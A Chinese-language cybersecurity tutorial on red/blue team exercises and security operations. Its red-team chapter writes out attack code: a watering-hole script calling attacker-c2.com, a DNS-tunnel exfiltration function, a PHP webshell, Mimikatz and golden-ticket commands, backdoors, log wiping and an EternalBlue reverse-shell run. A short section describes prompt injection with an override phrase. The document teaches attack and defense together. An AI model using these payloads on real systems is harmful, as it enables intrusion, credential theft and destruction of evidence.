# 网络安全 #10：红蓝对抗与安全运维

> 从攻防演练到日常安全运维的全景指南

---

## 引言

前九课我们走过了网络安全的完整知识体系：从攻防基础(#1)、密码学(#2)、OWASP Top 10(#3)、认证授权(#4)、操作系统安全(#5)、网络协议安全(#6)、安全工具实战(#7)，到社会工程学(#8)和日志与取证(#9)。现在，是时候将这些知识串联起来，进入网络安全最激动人心的领域——**红蓝对抗**与**安全运维(SecOps)**。

红蓝对抗不是游戏，而是组织验证自身安全防御能力的"实战演习"。红队模拟真实攻击者，蓝队负责防御和响应，紫队则促进两方协作。而安全运维，则是将这些对抗中获得的洞见，转化为日常的防御机制。

本课将深入讲解：
- 红蓝对抗的完整流程与角色分工
- ATT&CK框架如何指导攻防
- 红队核心攻击技术与蓝队防御策略
- SecOps的最佳实践与工具体系
- 新兴威胁场景下的应对思路

---

## 第1章：红蓝对抗基础

### 1.1 红队(Red Team)

**定义**：红队是模拟真实攻击者的安全团队，目标是在授权范围内，使用与真实APT组织相同或相近的技术、战术和流程(TTPs)来测试组织的安全防御能力。

**核心特点**：
- **目标导向**：不是找漏洞，而是验证能否达成特定目标（如获取核心数据、控制关键系统）
- **无剧本**：不遵循固定脚本，根据防御方的反应动态调整策略
- **全链路模拟**：从侦察到数据窃取，完整模拟攻击生命周期
- **隐蔽优先**：尽可能不被蓝队发现，或即使被发现也能"合法地"解释为正常行为

**典型任务**：
1. 外部渗透测试（从互联网发起攻击）
2. 内部横向移动（模拟内鬼或已入侵的攻击者）
3. 物理安全测试（尾随进入、设备植入）
4. 社会工程学测试（钓鱼邮件、电话诈骗）
5. 红队评估报告（发现→利用路径→建议）

### 1.2 蓝队(Blue Team)

**定义**：蓝队是负责防御和响应的安全团队，目标是检测、分析、响应和阻止红队（或真实攻击者）的攻击行为。

**核心特点**：
- **持续监控**：7×24小时安全监控
- **事件响应**：快速检测和响应安全事件
- **防御加固**：基于红队反馈持续改进防御
- **恢复能力**：确保业务连续性

**典型任务**：
1. SIEM告警分析与处置
2. EDR事件调查
3. 威胁狩猎（主动寻找潜伏威胁）
4. 安全设备运维与管理
5. 应急响应与取证分析

### 1.3 紫队(Purple Team)

**定义**：紫队不是独立团队，而是一种协作模式——红队与蓝队共享信息、共同演练，以最大化学习效果。

**关键特征**：
- **信息透明**：红队公开部分TTPs，蓝队分享检测能力
- **共同目标**：不是"红胜蓝败"，而是双方都提升
- **度量驱动**：建立可量化的防御成熟度指标
- **持续改进**：每次对抗都产生具体的防御改进项

### 1.4 ATT&CK框架

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) 是当今最权威的攻击行为知识库。它通过**战术→技术→子技术**三层结构，系统化描述攻击者的行为模式。

**三层结构**：
```
Tactics（战术）   →    Techniques（技术）   →    Sub-techniques（子技术）
  为什么做？             怎么做？                   具体怎么做？
  如：TA0006        如：T1110                     如：T1110.001
  凭证访问              暴力破解                      密码喷射
```

**14大战术域**：
| ID | 战术 | 描述 |
|----|------|------|
| TA0043 | 侦察(Reconnaissance) | 收集信息以规划攻击 |
| TA0042 | 资源开发(Resource Development) | 建立攻击基础设施 |
| TA0001 | 初始访问(Initial Access) | 进入目标网络 |
| TA0002 | 执行(Execution) | 运行恶意代码 |
| TA0003 | 持久化(Persistence) | 维持访问权限 |
| TA0004 | 提权(Privilege Escalation) | 获取更高权限 |
| TA0005 | 防御规避(Defense Evasion) | 逃避检测 |
| TA0006 | 凭证访问(Credential Access) | 窃取账户凭证 |
| TA0007 | 发现(Discovery) | 探测内部环境 |
| TA0008 | 横向移动(Lateral Movement) | 在内部网络扩散 |
| TA0009 | 收集(Collection) | 收集目标数据 |
| TA0011 | 命令与控制(Command and Control) | 建立C2通信 |
| TA0010 | 数据渗出(Exfiltration) | 窃取数据 |
| TA0040 | 影响(Impact) | 破坏系统或数据 |

### 1.5 对抗流程（Cyber Kill Chain）

Lockheed Martin 提出的杀伤链模型，描述了一次完整攻击的七个阶段：

```
┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐
│ 侦察     │→│ 武器化   │→│ 投递     │→│ 利用     │→│ 安装     │→│ C2通信   │→│ 行动     │
│Recon     │ │Weaponize│ │Deliver  │ │Exploit  │ │Install  │ │C2       │ │Actions  │
└─────────┘  └─────────┘  └─────────┘  └─────────┘  └─────────┘  └─────────┘  └─────────┘
```

1. **侦察**：收集目标信息（域名、IP范围、员工信息、技术栈）
2. **武器化**：制作恶意载荷（捆绑木马的PDF、带宏的Office文档）
3. **投递**：将载荷发送给目标（钓鱼邮件、USB丢弃、恶意广告）
4. **利用**：触发漏洞执行代码（浏览器漏洞、Office漏洞）
5. **安装**：在目标系统建立持久化（注册表Run键、计划任务）
6. **C2通信**：建立命令与控制信道（HTTP Beacon、DNS隧道）
7. **行动**：达成攻击目标（数据窃取、勒索加密、系统破坏）

**ATT&CK与Kill Chain的结合**：ATT&CK的14个战术域是对Kill Chain的扩展和细化，能更精确地描述攻击行为。

---

## 第2章：红队攻击技术

### 2.1 社会工程学攻击

社会工程学是人性的漏洞——技术无法完全防御。

#### 鱼叉钓鱼(Spear Phishing)

**原理**：针对特定个人或组织定制化的钓鱼攻击。与广撒网式钓鱼不同，鱼叉钓鱼会收集目标背景信息，制作高度可信的诱饵。

**实现机制**：
```bash
# 使用 SET (Social Engineering Toolkit) 创建钓鱼页面
# 1. 克隆目标登录页面
set> 1) Social-Engineering Attacks
set> 2) Website Attack Vectors
set> 3) Credential Harvester Attack Method
set> 2) Site Cloner
# 输入目标URL，会克隆该页面并记录凭证

# 使用 GoPhish 进行企业级钓鱼演练
# Web界面操作：创建 Campaign → 导入目标列表 → 选择邮件模板
# → 配置发送服务器(SMTP) → 启动
```

**防御/检测**：
- 邮件安全网关：SPF/DKIM/DMARC验证
- URL沙箱：点击前检测链接
- 安全意识培训：定期钓鱼演练
- 多因素认证：即使凭证泄露也不可登录

#### 水坑攻击(Watering Hole)

**原理**：攻击者分析目标群体经常访问的网站，先攻陷这些网站植入恶意代码，等待目标自动访问。

**技术细节**：
```javascript
// 水坑攻击植入的恶意JS示例（隐蔽加载）
(function() {
    var img = new Image();
    img.src = 'https://attacker-c2.com/beacon?uid=' + 
              btoa(navigator.userAgent + '|' + 
              new Date().getTime());
    
    // 利用浏览器漏洞触发远程执行
    // 通过 0-day 或 N-day 漏洞加载 exploit
    var script = document.createElement('script');
    script.src = 'https://attacker-c2.com/exp/exploit.js';
    document.body.appendChild(script);
})();
```

**防御/检测**：
- 浏览器隔离技术（远程浏览器/沙箱）
- 企业级DNS过滤（阻止已知恶意域名）
- 终端安全软件的Web信誉扫描

#### 凭证窃取(Credential Theft)

**常见手法**：
1. **键盘记录器**：记录用户所有键盘输入
2. **内存抓取**：从LSASS进程dump凭证(Mimikatz)
3. **网络嗅探**：捕获明文HTTP/FTP等协议密码
4. **密码提示问题**：通过社工获取重置问题答案

```cmd
:: Windows下使用Mimikatz从内存提取凭证（需高权限）
mimikatz # privilege::debug          // 启用SeDebugPrivilege
mimikatz # sekurlsa::logonpasswords  // 提取登录凭证
mimikatz # lsadump::sam              // 从SAM提取本地Hash
mimikatz # lsadump::dcsync /user:krbtgt  // DC同步获取域Hash
```

### 2.2 横向移动技术

一旦进入单点，攻击者需要横向移动到高价值目标。

#### Pass-the-Hash (PtH)

**原理**：在Windows域环境中，验证不一定需要明文密码——NTLM Hash足以通过认证。

```cmd
# 使用 impacket 工具套件进行 PtH
# 通过NTLM Hash直接获取远程系统shell
> impacket-wmiexec -hashes LMHASH:NTHASH domain/user@target-ip

# 示例
> impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100
```

**检测**：
- 监控异常的事件ID 4624（登录类型3 - 网络登录）
- 检测多个设备上同一账户的异常登录
- LmCompatibilityLevel 设置为仅允许NTLMv2

#### Kerberos票据攻击

Kerberos攻击是域环境中的高影响力攻击技术。

**Golden Ticket（黄金票据）**：
```
┌─────────────────────────────────────────────┐
│ 原理：伪造KRBTGT账户的TGT(Ticket Granting   │
│ Ticket)，可以访问域内任何资源。              │
│                                              │
│ 前提条件：获取KRBTGT账户的NTLM Hash         │
│ (通常需要域管理员权限)                       │
└─────────────────────────────────────────────┘
```

```cmd
:: Mimikatz 生成黄金票据
mimikatz # kerberos::golden /domain:corp.local 
  /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx 
  /krbtgt:KRBTGT_HASH 
  /user:Administrator 
  /id:500 
  /ticket:golden.kirbi

:: 注入票据
mimikatz # kerberos::ptt golden.kirbi

:: 验证 - 无密码访问域控
> dir \\dc01\c$
```

**Silver Ticket（白银票据）**：伪造服务票据，仅能访问特定服务，但更隐蔽（不接触DC）。

**Kerberoasting**：
```cmd
# 请求并破解服务账户的TGS票据
> impacket-GetUserSPNs domain/user:password -request
# 获取hashcat格式的票据，离线破解
> hashcat -m 13100 hash.txt wordlist.txt
```

**检测**：
- 监控Kerberos服务票据请求(TGS_REQ)的异常模式
- 检测黄金票据：TGT生命周期异常（默认10小时）
- Kerberoasting检测：同一账户短时间内请求大量TGS

### 2.3 C2信道技术

C2是攻击者与受害者的通信通道，设计核心是隐蔽和弹性。

#### HTTPS C2（最常用）

```json
// Cobalt Strike Malleable C2 配置示例
{
    "http-get": {
        "uri": "/api/v2/status",
        "headers": {
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        },
        "output": {
            "base64": true,
            "prepend": "{\"data\":\"",
            "append": "\"}"
        }
    },
    "http-post": {
        "uri": "/api/v2/report",
        "headers": {
            "Content-Type": "application/json"
        }
    },
    "jitter": "30%",     // 随机延迟
    "sleeptime": 60000   // 心跳间隔（毫秒）
}
```

**C2通信模式**：
```
┌──────────┐     HTTPS伪装流量    ┌──────────┐    请求指令    ┌──────┐
│ 受害主机  │ ◄──────────────────► │ 跳板/C2   │ ◄──────────► │ C2   │
│ (Beacon)  │    模拟API请求      │ 前置代理   │              │ 团队  │
└──────────┘                     └──────────┘              └──────┘
```

#### DNS隧道

**原理**：将数据编码到DNS查询请求中，利用DNS协议逃逸防火墙。

```python
# DNS隧道编码示例（简化）
import base64, dns.resolver

def exfiltrate_data(data, domain="tunnel.attacker.com"):
    # 将数据BASE32编码后作为DNS查询的子域名
    encoded = base64.b32encode(data.encode()).decode()
    query = f"{encoded}.{domain}"
    # 发送DNS TXT查询
    resolver = dns.resolver.Resolver()
    answers = resolver.resolve(query, 'TXT')
    return answers
```

**检测**：
- 异常的DNS请求频率
- 域名包含随机字符（BASE32/BASE64）
- 不存在的域名的查询量激增
- 高字节的DNS请求数据量

#### Domain Fronting

**原理**：利用CDN的路由机制——HTTP Host头指向合法域名，但TLS SNI指向恶意域名，使请求看似指向CDN上的合法服务。

```bash
# Domain Fronting示例
# 请求看起来发往 cloudflare.com，实则路由到 attacker.com
curl -H "Host: cloudflare.com" https://attacker-cdn-domain.com/beacon
```

**现状**：主流CDN厂商已禁止Domain Fronting，但仍有少量CDN可用。

### 2.4 权限维持

#### WebShell

```php
// 一句话WebShell (ASP/PHP/JSP)
<?php @eval($_POST['cmd']);?>

// 隐蔽版 - 图片马
// 在正常图片尾部附加PHP代码
copy normal.jpg /b + shell.php /b hidden_shell.jpg

// .htaccess等方式隐藏
<FilesMatch "\.(jpg|png|gif)$">
SetHandler application/x-httpd-php
</FilesMatch>
```

**检测**：
- Web日志中异常的POST请求
- 文件完整性监控（关键文件MD5变化）
- 代码执行流监控（Web应用防火墙WAF）

#### Golden Ticket（权限维持）

除了作为横向移动技术，黄金票据也是强大的权限维持手段——域管理权限丢失后仍可访问所有资源。

#### 后门技术

```bash
# SSH后门 - 利用AuthorizedKeys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@redteam" >> ~/.ssh/authorized_keys

# 系统服务后门 (Windows)
sc create RedTeamSvc binPath= "C:\windows\temp\backdoor.exe" start= auto

# 计划任务持续
schtasks /create /tn "SystemUpdate" /tr "powershell -enc BASE64PAYLOAD" /sc daily /st 09:00
```

### 2.5 痕迹清除

攻击者在完成任务后，通常需要清除入侵痕迹。

```bash
# Linux日志清理
> /var/log/auth.log           # 清空认证日志
> /var/log/syslog             # 清空系统日志
sed -i '/attacker-ip/d' /var/log/apache2/access.log  # 删除特定IP记录
rm -rf /var/log/journal/*     # 删除systemd日志
unset HISTFILE && history -c  # 清除bash历史

# Windows日志清理
wevtutil cl System             # 清除系统日志
wevtutil cl Security           # 清除安全日志
wevtutil cl Application        # 清除应用日志
wevtutil cl PowerShell         # 清除PowerShell日志

# 时间戳修改（伪装文件访问时间）
touch -t 202501010000.00 /path/to/file  # 修改Linux文件时间
```

**检测**：
- 日志源发送心跳，缺失即告警
- 集中式日志存储（SIEM），攻击者无法接触
- 日志备份到不可变存储（WORM）

---

## 第3章：蓝队防御技术

### 3.1 SIEM/SOAR

#### SIEM (Security Information and Event Management)

**核心功能**：
1. **日志聚合**：从路由器、防火墙、服务器、应用收集日志
2. **关联分析**：跨源日志的威胁关联
3. **告警生成**：基于规则/异常的告警
4. **合规报告**：满足等保2.0、ISO 27001的日志审计要求

**主流方案**：
```
商业：Splunk、IBM QRadar、ArcSight
开源：ELK Stack、Wazuh、Graylog
云原生：Azure Sentinel、AWS GuardDuty、GCP Chronicle
```

**Wazuh规则示例**：
```xml
<!-- 检测可疑的横向移动 - 使用Admin账户从非预期主机登录 -->
<rule id="100xxx" level="12">
  <if_group>windows|authentication|success</if_group>
  <field name="win.eventdata.targetUserName">^Administrator$</field>
  <field name="win.eventdata.ipAddress" type="pcre2">
    !^(10\.|172\.(1[6-9]|2[0-9]|3[01])|192\.168\.)
  </field>
  <description>Admin login from unexpected IP: $(win.eventdata.ipAddress)</description>
  <options>no_full_log</options>
</rule>
```

#### SOAR (Security Orchestration, Automation and Response)

**核心功能**：
- **剧本(Playbook)**：自动化响应流程
- **编排**：联动多款安全产品
- **工单**：自动创建和分配事件

```yaml
# SOAR Playbook示例 - 高危告警自动处置
name: "High Severity Alert Triage"
steps:
  - name: "Enrich IOC"
    action: "query_virustotal"
    params:
      hash: "{{alert.file_hash}}"
      
  - name: "Check Threat Intel"
    action: "query_misp"
    params:
      indicator: "{{alert.ip_address}}"
      
  - if: "{{enrich.malicious == true}}"
    steps:
      - name: "Block IP on Firewall"
        action: "block_ip"
        params:
          ip: "{{alert.ip_address}}"
          duration: 24h
          
      - name: "Quarantine Endpoint"
        action: "edr_quarantine"
        params:
          hostname: "{{alert.hostname}}"
          
      - name: "Create Incident Ticket"
        action: "create_jira_ticket"
```

### 3.2 EDR/XDR

#### EDR (Endpoint Detection and Response)

**原理**：在终端上持续采集行为数据，通过规则和ML模型检测异常。

**数据采集点**：
```
┌────────────────────────────────────┐
│            EDR Agent              │
├────────────────────────────────────┤
│ ● 进程创建/终止  ● 文件操作      │
│ ● 注册表变更     ● 网络连接      │
│ ● 模块加载       ● 计划任务      │
│ ● PowerShell日志  ● DNS查询      │
│ ● 内存访问       ● 驱动加载      │
└────────────────────────────────────┘
```

**Sysmon配置示例**（Windows监控利器）：
```xml
<Sysmon>
  <!-- 检测lsass进程的异常访问（疑似Mimikatz） -->
  <RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
      <TargetImage condition="image">lsass.exe</TargetImage>
      <SourceImage condition="image">
        not C:\Windows\system32\svchost.exe and
        not C:\Windows\system32\taskmgr.exe and
        not C:\Program Files\
      </SourceImage>
    </ProcessAccess>
  </RuleGroup>
  
  <!-- 检测网络连接事件 -->
  <RuleGroup name="" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">443</DestinationPort>
      <DestinationPort condition="is">80</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

**常见EDR检测规则（Sigma格式）**：
```yaml
title: Suspicious LSASS Access via Mimikatz
id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10  # ProcessAccess
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: '0x1010'  # Mimikatz 1.x debug access
  condition: selection
falsepositives:
  - Legitimate admin tools
level: high
```

#### XDR (Extended Detection and Response)

**演进**：EDR只覆盖端点，XDR扩展到网络、邮件、云、身份。

```
┌──────────────────────────────────────────────────┐
│                     XDR                          │
├──────────┬──────────┬──────────┬────────┬────────┤
│  端点    │  网络    │  邮件    │  云    │  身份  │
│  EDR     │  NDR     │  Email   │  CSPM  │  IAM   │
├──────────┴──────────┴──────────┴────────┴────────┤
│              统一分析引擎 + 关联规则                │
│             自动化响应 + 全局溯源                   │
└──────────────────────────────────────────────────┘
```

### 3.3 蜜罐与欺骗防御

#### 蜜罐(Honeypot)

**原理**：部署诱饵系统（看似有价值的服务或数据），引诱攻击者攻击，从而：

1. **检测**：蜜罐不应有正常流量，任何访问都是可疑的
2. **分析**：观察攻击者行为和技术
3. **消耗**：拖慢攻击者，消耗其资源
4. **混淆**：在真实数据中混入假数据

```bash
# 使用 T-Pot 部署全功能蜜罐平台
# T-Pot 集成了多种蜜罐服务
> docker run -d --name tpot \
  -p 64295:64295 \
  -p 22:22 \
  -v /data/tpot:/data \
  telekom/t-pot

# 内置的蜜罐类型
# - cowrie: SSH/Telnet蜜罐
# - dionaea: 服务漏洞蜜罐
# - honeytrap: 低交互蜜罐
# - glastopf: Web应用蜜罐
# - elasticpot: Elasticsearch蜜罐

# 分析蜜罐捕获的攻击日志
> cat /data/tpot/cowrie/log/cowrie.json | jq '.[] | {src_ip, proto, cmd}'
```

#### 蜜网(Honeynet)

**大规模诱饵网络**，多个蜜罐互联，模拟一个完整的企业内网环境。

#### 欺骗技术(Deception Technology)

```
┌──────────────────────────────────────────────┐
│           Deception Platform                 │
├──────────────────────────────────────────────┤
│ ● 虚假凭证：放在桌面的fake_passwords.txt     │
│ ● 虚假数据：混杂在数据库中的诱饵记录         │
│ ● 虚假服务：看似SMB/SSH服务的诱饵            │
│ ● 虚假网络：蜜罐间组成完整的虚拟网络拓扑     │
│ ● 虚假文档：包含唯一标识的水印文档            │
└──────────────────────────────────────────────┘
```

### 3.4 威胁狩猎(Threat Hunting)

**定义**：主动、假设驱动的搜索行为，寻找已经绕过现有防御措施的攻击者。

**与传统检测的区别**：
```
传统检测：规则匹配 → 告警 → 响应  (被动等待)
威胁狩猎：假设 → 搜索 → 发现 → 响应  (主动寻找)
```

**狩猎假设示例**：

| 假设 | 搜索方向 | 数据源 |
|------|---------|--------|
| 域内存在Golden Ticket | 查找异常TGT生命周期 | Windows安全日志Event 4768/4769 |
| 攻击者通过DNS隧道外传 | DNS TXT查询异常频次 | DNS服务器日志 |
| 内网存在横向移动 | Pass-the-Hash异常登录 | 4624登录事件，NTLM认证 |
| 存在隐蔽C2信道 | Beaconing模式的HTTP流量 | 代理日志、Netflow |

**狩猎方法论**：
```
1. 提出假设（基于威胁情报、新漏洞、攻防经验）
2. 收集数据（SIEM、EDR、网络流量、DNS日志）
3. 分析验证（模式匹配、异常检测、图分析）
4. 得出结论（确认感染 or 误报 or 待深挖）
5. 更新防御（新增检测规则、改进流程）
```

### 3.5 事件响应流程

行业标准NIST 800-61 定义了6阶段响应流程：

```
┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
│ 准备     │→│ 检测分析  │→│ 遏制     │→│ 根除     │→│ 恢复     │→│ 复盘     │
│Prepare   │ │Detect     │ │Contain   │ │Eradicate │ │Recover   │ │Postmortem│
└──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘
```

#### 阶段1：准备

**关键动作**：
- 制定事件响应计划（IR Plan）
- 组建事件响应团队（CSIRT/SOC）
- 准备取证工具箱和备用环境
- 建立通信渠道和上报机制
- 定期演练（Tabletop Exercise）

#### 阶段2：检测与分析

**三问**：
1. 发生了什么？（What happened?）
2. 影响范围？（What is the impact?）
3. 在什么阶段？（Where in the kill chain?）

**分析要点**：
- **范围**：受影响的主机/用户/数据
- **横移**：攻击者访问过哪些系统
- **根因**：入口点是什么
- **指标**：IOC提取（域名/IP/Hash）

#### 阶段3：遏制

**短期遏制**（分钟级）：
```bash
# 断开网络连接
ifconfig eth0 down          # Linux
netsh interface set interface "以太网" admin=disable  # Windows

# 隔离主机（SOC端点管理）
> edr_quarantine --hostname attacker-compromised

# 防火墙阻断
iptables -A INPUT -s 192.168.1.100 -j DROP
```

**长期遏制**（小时级）：
- 创建网络ACL阻止C2流量
- 禁用受影响账户
- 切入备份环境

#### 阶段4：根除

```bash
# 移除持久化机制
# Windows
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malware /f
schtasks /delete /tn "MaliciousTask" /f

# Linux
crontab -e  # 删除恶意任务
rm -rf /var/www/html/shell.php
```

#### 阶段5：恢复

- 从干净的备份还原系统
- 重新构建受损系统（非简单删除恶意文件）
- 修改所有受影响账户的密码
- 逐步恢复服务（监控确认后再下一台）

#### 阶段6：复盘(Postmortem)

**内容**：
1. 时间线：事件发生到恢复的完整时间线
2. 根本原因：漏洞/配置/人为错误的根源
3. 做得好的：响应中学到的经验
4. 改改进项：新规则、新设备、新流程
5. 执行计划：责任人和截止日期

---

## 第4章：安全运维(SecOps)

### 4.1 漏洞管理生命周期

漏洞管理不是"扫到了就补"，而是持续的生命周期过程。

```
┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
│ 发现     │→│ 评估     │→│ 优先级   │→│ 修复     │→│ 验证     │
│ Discovery│ │ Assessment│ │ Prioritize│ │ Remediate│ │ Verify   │
└──────────┘  └──────────┘  └──────────┘  └──────────┘  └──────────┘
     ↑                                                │
     └──────────────── 持续监控 ────────────────────────┘
```

#### 阶段1：发现(Discovery)

```bash
nmap -sn 10.0.0.0/24 -oA live_hosts          # 主机发现
nmap -sV -p 80,443,22,3389 10.0.0.0/24       # 服务发现
```

#### 阶段2：评估(Assessment)

**CVE评估**属性：CVE ID、CVSS评分(0-10)、EPSS被利用概率、影响范围。

**CVSS v3**：CVSS = f(AV, AC, PR, UI, S, C, I, A)
- AV: 攻击向量 N(网络)/A(相邻)/L(本地)/P(物理)
- AC: 攻击复杂度 L(低)/H(高)
- PR: 所需权限 N(无)/L(低)/H(高)
- UI: 用户交互 N(无)/R(需要)
- S: 影响范围 U(不变)/C(改变)
- C/I/A: 机密性/完整性/可用性 H(高)/L(低)/N(无)

#### 阶段3：优先级排序

```
高危漏洞 + 暴露在公网 + 核心业务 = 紧急修复 (24h内)
中危漏洞 + 内网 + 非核心系统 = 常规修复 (7天内)
低危漏洞 + 有缓解措施 + 测试环境 = 计划修复 (30天内)
```

#### 阶段4：修复(Remediate)

策略：1) 官方补丁(最优) 2) 配置缓解(WAF规则/ACL) 3) 虚拟补丁(IPS规则) 4) 系统隔离

#### 阶段5：验证(Verify)

```bash
nmap --script vuln -p 80 10.0.0.50  # 重扫确认修复
```

### 4.2 配置基线管理

**CIS Benchmark**：Center for Internet Security 发布的安全配置基准。

```powershell
# CIS Windows Server 2022 基线检查
# 密码最长使用期限 ≤ 90天
$maxPwdAge = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").MaximumPasswordAge
# 禁用LLMNR（防御横向移动攻击）
$llmnr = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient").EnableMulticast
```

```bash
# OpenSCAP自动化合规检查
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
  --results-arf results.xml --report report.html \
  /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
```

### 4.3 补丁管理策略

| 类型 | 响应时间 | 示例 |
|------|---------|------|
| 紧急补丁(0-day) | 24-48h | CVE-2024-XXX |
| 安全更新 | 7天 | MS Patch Tuesday |
| 常规更新 | 30天 | 非安全修复 |
| 计划更新 | 90天 | 季度升级 |

```powershell
Install-Module PSWindowsUpdate
Get-WUList -Category "SecurityUpdates" -ComputerName "SRV-APP-01"
Install-WUUpdates -Updates (Get-WUList -Category "SecurityUpdates") -AutoReboot
```

### 4.4 资产管理与SBOM

**资产管理**："不知道有什么，就无法保护什么。" 关键属性：主机名/IP/MAC、所有者、位置、软件栈、生命周期、安全状态。

**SBOM**：软件物料清单，列出所有组件版本和依赖。
```bash
syft nginx:1.25 -o spdx-json > nginx-sbom.json   # 生成SBOM
grype sbom:nginx-sbom.json --fail-on critical     # 扫描漏洞
```

### 4.5 合规审计

**等保2.0**：安全通用要求(物理/网络/主机/应用/数据) + 扩展要求(云/移动/物联/工控) + 管理要求(制度/机构/人员/建设/运维)。

等保三级关键控制点：双因子认证、登录锁定、默认Deny、最小权限、日志≥6个月、每日增量/每周全量/异地备份。

**ISO 27001:2022**：14个控制域、93个控制项，涵盖信息安全策略、访问控制、密码学、运维安全、事件管理、业务连续性。

---

## 第5章：实战工具链

### 5.1 渗透测试框架

#### Metasploit Framework

```bash
msfconsole -q
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.50
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit

# Meterpreter后渗透
meterpreter > getsystem            # 提权SYSTEM
meterpreter > hashdump             # 凭证提取
meterpreter > keyscan_start        # 键盘记录
meterpreter > run persistence      # 持久化
meterpreter > load mimikatz        # 加载Mimikatz模块
```

#### Cobalt Strike

商业级红队平台：Team Server(C2) + Beacon(Agent) + 攻击模块(横移/凭证) + Malleable C2(流量伪装)。

#### Empire

开源PowerShell后渗透框架，无需powershell.exe即可内存执行。
```powershell
(Empire) > uselistener http
(Empire) > usestager windows/launcher_bat
(Empire) > interact [agent]
(agent) > usemodule credentials/mimikatz/logonpasswords
```

### 5.2 网络分析工具

#### Wireshark

```bash
# 关键显示过滤
http.request                         # HTTP请求
tls.handshake.type == 1              # TLS Client Hello
dns.qry.name contains "evil"         # DNS查询
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN扫描检测
frame contains "flag"                # 搜索特定内容
```

#### tcpdump

```bash
tcpdump -i eth0 -n host 10.0.0.50          # 特定主机
tcpdump -i eth0 -n port 443                # 443端口
tcpdump -i eth0 -n -s 0 -w capture.pcap    # 保存PCAP
tcpdump -r capture.pcap -n 'port 53'       # 分析PCAP
```

#### Zeek

网络流量分析框架，生成结构化日志：conn.log / dns.log / http.log / ssl.log / files.log，而非原始包。适合大规模网络监控。

### 5.3 漏洞扫描工具

```bash
# Nessus
nessuscli scan list
nessuscli scan new --name "Scan" --policy "CIS Benchmark" --target "10.0.0.0/24"

# OpenVAS/GVM
gvm-start
gvm-cli socket --xml "<create_task><name>Scan</name><target id='...'/></create_task>"

# Nmap NSE漏洞脚本
nmap --script vuln 192.168.1.0/24              # 通用漏洞
nmap --script smb-vuln* 192.168.1.100           # SMB漏洞专扫
nmap --script http-vuln* 192.168.1.50 -p 80     # Web漏洞
```

### 5.4 Web安全工具

**Burp Suite**：代理→爬取→扫描→重放→利用。扩展：Turbo Intruder(高速爆破)、Autorize(越权检测)、Collaborator(带外检测)。

**SQLMap**：
```bash
sqlmap -u "http://target.com/page?id=1" --dbs                    # 列数据库
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump # 脱表
sqlmap -r request.txt --batch                                     # 基于文件
sqlmap --tamper=space2comment --random-agent                      # 绕过WAF
```

**Nuclei**：YAML模板驱动，社区上万个模板。
```bash
nuclei -u https://target.com                      # 单目标
nuclei -l targets.txt -t cves/                    # CVE批量
nuclei -u https://target.com -severity critical   # 只跑严重级
```

### 5.5 逆向工程工具

| 工具 | 类型 | 核心能力 |
|------|------|---------|
| Ghidra | 开源(NSA) | 多架构反编译→类C伪代码、Python/Java脚本 |
| IDA Pro | 商业 | 交互式反汇编、IDAPython自动化、Hex-Rays反编译器 |
| x64dbg | 开源 | Windows调试器、内存补丁、Scylla脱壳导入表修复 |

---

## 第6章：新兴挑战

### 6.1 云安全

#### CSPM (Cloud Security Posture Management)

自动检测云配置风险：
```bash
checkov -d terraform/                        # 扫描Terraform IaC
checkov -f kubernetes/deployment.yaml        # 扫描K8s配置
prowler aws --checks s3_bucket_public_access # AWS S3公开访问检查
```

常见事件：S3存储桶公开泄露、安全组0.0.0.0/0开放、IAM权限过宽、密钥管理不当。

#### CWPP (Cloud Workload Protection Platform)

保护云工作负载：漏洞扫描(镜像/运行时)、入侵检测(文件完整性/进程监控)、合规基线(CIS for Docker/K8s)、运行时保护。

#### 容器逃逸防护

逃逸路径：1) 内核漏洞 2) 特权容器(--privileged) 3) Docker Socket暴露 4) 共享PID/IPC命名空间

防御：禁止特权容器、禁止root运行、PodSecurityPolicy限制sysctl和volume挂载。

### 6.2 AI安全

#### 对抗样本(Adversarial Examples)

向输入添加人类不可察觉的扰动，导致AI模型误判。
```python
# FGSM对抗样本生成
perturbations = tf.sign(gradient)
adversarial_image = image + 0.1 * perturbations
# 熊猫→长臂猿，人眼看不出差异
```

防御：对抗训练、输入净化(降噪/压缩)、集成多模型投票、对抗样本检测器。

#### 模型投毒(Model Poisoning)

污染训练数据或模型参数，植入后门。例如给停车标志加特定贴纸→模型误判为限速标志。

防御：数据来源验证、差分隐私、模型权重哈希校验、联邦学习梯度验证。

#### 提示注入(Prompt Injection)

绕过LLM安全限制：直接注入("忽略之前指令")、间接注入(爬取网页中的恶意指令)、越狱(Jailbreak角色扮演)。

防御：输入过滤(关键词+ML)、输出验证、敏感操作二次确认、提示边界加固。

### 6.3 供应链安全

**攻击面**：
1. 依赖混淆：公开仓库同名包覆盖私有包
2. 恶意包：向PyPI/npm上传恶意包
